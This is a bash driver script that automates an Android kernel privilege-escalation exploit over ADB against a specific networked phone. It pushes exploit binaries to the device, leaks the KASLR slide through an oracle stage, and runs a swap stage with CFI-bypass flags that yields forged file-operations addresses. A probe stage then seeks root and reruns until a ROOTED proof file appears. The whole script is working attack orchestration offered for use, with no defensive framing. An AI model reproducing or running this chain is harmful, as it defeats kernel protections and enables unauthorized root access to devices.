#!/bin/bash
# rw_drive.sh v2 — collapse-plan driver (host, Git Bash).
# O-fire (spray-free oracle) -> decode -> N-fire (swap, HOLD, detached)
# -> poll HOLD marker -> swap_probe v4 (collapse + root chain).
# Usage: ./rw_drive.sh [max_cycles]
ADB="/c/Users/LENOVO/AppData/Local/Microsoft/WinGet/Packages/Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe/platform-tools/adb.exe"
SER=192.168.1.108:5555
ROOT="$(cd "$(dirname "$0")" && pwd)"
MAX=${1:-10}

adb() { MSYS_NO_PATHCONV=1 "$ADB" -s "$SER" "$@"; }

"$ADB" connect $SER >/dev/null 2>&1
adb shell "mkdir -p /data/local/tmp" >/dev/null 2>&1
adb push ghostlock-cph2521 /data/local/tmp/gl_rw >/dev/null 2>&1
adb push swap_probe /data/local/tmp/swap_probe >/dev/null 2>&1
adb shell "chmod 755 /data/local/tmp/gl_rw /data/local/tmp/swap_probe" >/dev/null 2>&1

uptime() { adb shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r'; }

DONE=0; TRIES=0
while [ $TRIES -lt $MAX ]; do
  UP0=$(uptime)
  if [ -z "$UP0" ]; then
    echo "no adb ($(date +%H:%M:%S)); reconnecting"
    MSYS_NO_PATHCONV=1 "$ADB" disconnect $SER >/dev/null 2>&1
    "$ADB" connect $SER >/dev/null 2>&1
    MSYS_NO_PATHCONV=1 "$ADB" devices 2>/dev/null | grep -q 596666e9
    sleep 20; continue
  fi
  TRIES=$((TRIES+1)); cycle=$TRIES
  echo "=== CYCLE $cycle === $(date +%H:%M:%S)"

  # redirect already live from a previous fire? skip the O-fire entirely
  BID0=$(adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '')
  S0=$(python tools/slide_decode.py "$BID0" 2>/dev/null | awk '{print $3}')
  case "$S0" in 0x*) echo "redirect ALREADY LIVE (slide=$S0) — straight to N-fire"; SLIDE=$S0; SKIP_O=1;; *) SKIP_O=0;; esac
  [ "$UP0" -lt 130 ] && { echo "uptime ${UP0}s < 130 — waiting for boot to settle"; sleep $((130-UP0+10)); }

  # ---- O-fire: spray-free oracle (blocking; process exits) ----
  if [ "$SKIP_O" = "1" ]; then
    :
  else
  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE=1\nexport MODE4_SWAP_NOCFI=1\ncd /data/local/tmp\n/data/local/tmp/gl_rw; echo EXIT=$?\n' > tmp_o.sh
  adb push tmp_o.sh /data/local/tmp/glr_raw.sh >/dev/null 2>&1
  adb shell "tr -d '\\r' < /data/local/tmp/glr_raw.sh > /data/local/tmp/glrr.sh && chmod 755 /data/local/tmp/glrr.sh" >/dev/null 2>&1
  adb shell "rm -f /data/local/tmp/gl_out.txt; nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 & sleep 1" >/dev/null 2>&1
  for i in $(seq 1 100); do
    E=$(adb shell "grep -c 'EXIT=' /data/local/tmp/gl_out.txt 2>/dev/null" | tr -d '\r')
    [ "$E" -ge 1 ] 2>/dev/null && break
    sleep 3
  done
  BID=$(adb shell "cat /proc/sys/kernel/random/boot_id" | tr -d '\r')
  UP1=$(uptime)
  echo "O-fire: boot_id=$BID uptime=$UP1"
  [ -z "$UP1" ] && { echo "O-fire crashed boot; settling"; sleep 100; continue; }
  SLIDE=$(python tools/slide_decode.py "$BID" 2>/dev/null | awk '{print $3}')
  case "$SLIDE" in 0x*) ;; *) echo "oracle miss ($SLIDE); re-roll"; sleep 45; continue;; esac
  fi
  echo "SLIDE=$SLIDE (redirect live)"

  # ---- N-fire: swap + HOLD, detached ----
  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE_SWAP=1\nexport KASLR_SLIDE=%s\nexport MODE4_SWAP_NOCFI=1\nexport MODE4_SWAP_HOLD=1\ncd /data/local/tmp\n/data/local/tmp/gl_rw; echo EXIT=$?\n' "$SLIDE" > tmp_n.sh
  adb push tmp_n.sh /data/local/tmp/glr_raw.sh >/dev/null 2>&1
  adb shell "tr -d '\\r' < /data/local/tmp/glr_raw.sh > /data/local/tmp/glrr.sh && chmod 755 /data/local/tmp/glrr.sh && rm -f /data/local/tmp/gl_out.txt && nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 &" >/dev/null 2>&1
  sleep 2
  LS=$(adb shell "ls /data/local/tmp/glrr.sh 2>&1" | tr -d '\r')
  case "$LS" in *glrr.sh*) ;; *) echo "runner missing: $LS"; sleep 45; continue;; esac

  # ---- poll for HOLD (walk done, swap live) ----
  HOLD=""
  for i in $(seq 1 90); do
    H=$(adb shell "grep -c 'SWAP_HOLD\|HOLD: spray live' /data/local/tmp/gl_out.txt 2>/dev/null" | tr -d '\r')
    [ "$H" -ge 1 ] 2>/dev/null && { HOLD=1; break; }
    # died early?
    D=$(adb shell "grep -c 'EXIT=' /data/local/tmp/gl_out.txt 2>/dev/null" | tr -d '\r')
    [ "$D" -ge 1 ] 2>/dev/null && break
    sleep 3
  done
  UP2=$(uptime)
  if [ -z "$HOLD" ]; then
    echo "N-fire no HOLD (uptime $UP1 -> $UP2); re-roll"
    adb shell "pkill -f glrr.sh; pkill gl_rw" >/dev/null 2>&1
    sleep 90; continue
  fi
  FF=$(adb shell "grep -o 'fake_fops (ffffff[0-9a-f]*)' /data/local/tmp/gl_out.txt | tail -1 | grep -o 'ffffff[0-9a-f]*'" | tr -d '\r')
  GLPID=$(adb shell "grep -o 'pid=[0-9]*' /data/local/tmp/gl_out.txt | head -1 | cut -d= -f2" | tr -d '\r')
  echo "WINDOW OPEN: fake_fops=$FF gl_pid=$GLPID uptime=$UP2"

  # ---- THE PROBE (collapse + root) ----
  adb shell "/data/local/tmp/swap_probe $FF $SLIDE $GLPID 2>&1" | tr -d '\r'
  RC=$?
  echo "probe rc=$RC"
  sleep 3
  adb shell "cat /data/local/tmp/ROOTED 2>/dev/null; id; cut -d. -f1 /proc/uptime" | tr -d '\r'
  if adb shell "test -f /data/local/tmp/ROOTED" >/dev/null 2>&1; then
    echo "*** ROOT PROOF FILE EXISTS — cycle $cycle ***"
    exit 0
  fi
  # boot survived?
  UP3=$(uptime)
  echo "post-probe uptime=$UP3"
  adb shell "pkill -f glrr.sh; pkill gl_rw" >/dev/null 2>&1
  if [ -n "$UP3" ] && [ "$UP3" -ge "$UP2" ] 2>/dev/null; then
    echo "boot alive after probe — cleaning stale ROOTED and re-rolling"
    adb shell "rm -f /data/local/tmp/ROOTED" >/dev/null 2>&1
    sleep 20
  else
    echo "boot rebooted after probe; settling"
    sleep 100
  fi
done
echo "no root after $MAX cycles"
exit 1
